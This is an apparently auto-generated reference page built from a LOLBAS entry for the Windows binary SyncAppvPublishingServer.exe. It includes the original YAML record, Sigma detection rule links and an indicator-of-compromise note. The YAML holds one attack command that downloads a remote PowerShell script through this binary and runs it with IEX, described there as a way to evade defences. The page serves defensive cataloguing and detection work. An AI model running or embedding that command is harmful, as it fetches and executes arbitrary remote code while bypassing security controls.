---
parsed_by: focuslocust
source: lolbas
type: generated
---
# SyncAppvPublishingServer.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `syncappvpublishingserver.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Syncappvpublishingserver.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [SyncAppvPublishingServer.exe](../../tools/windows/syncappvpublishingserver.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | syncappvpublishingserver.exe |
| name | SyncAppvPublishingServer.exe |
| type | tool |
| source | lolbas |
| url | https://twitter.com/monoxgas/status/895045566090010624 |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@monoxgas'
  Person: Nick Landers
Author: Oddvar Moe
Commands:
- Category: Execute
  Command: SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX"
  Description: Example command on how inject Powershell code into the process
  MitreID: T1218
  OperatingSystem: Windows 10 1709, Windows 10 1703, Windows 10 1607
  Privileges: User
  Tags:
  - Execute: PowerShell
  Usecase: Use SyncAppvPublishingServer as a Powershell host to execute Powershell code. Evade defensive counter measures
Created: 2018-05-25
Description: Used by App-v to get App-v server lists
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/powershell/powershell_script/posh_ps_syncappvpublishingserver_exe.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/powershell/powershell_module/posh_pm_syncappvpublishingserver_exe.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_syncappvpublishingserver_execute_psh.yml
- IOC: SyncAppvPublishingServer.exe should never be in use unless App-V is deployed
Full_Path:
- Path: C:\Windows\System32\SyncAppvPublishingServer.exe
- Path: C:\Windows\SysWOW64\SyncAppvPublishingServer.exe
Name: SyncAppvPublishingServer.exe
Resources:
- Link: https://twitter.com/monoxgas/status/895045566090010624
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Syncappvpublishingserver.yml
```

## Detection / Analysis Notes

```text
IOC: SyncAppvPublishingServer.exe should never be in use unless App-V is deployed
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/powershell/powershell_module/posh_pm_syncappvpublishingserver_exe.yml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/powershell/powershell_script/posh_ps_syncappvpublishingserver_exe.yml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_syncappvpublishingserver_execute_psh.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/powershell/powershell_script/posh_ps_syncappvpublishingserver_exe.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/powershell/powershell_module/posh_pm_syncappvpublishingserver_exe.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_syncappvpublishingserver_execute_psh.yml
- IOC: SyncAppvPublishingServer.exe should never be in use unless App-V is deployed
```
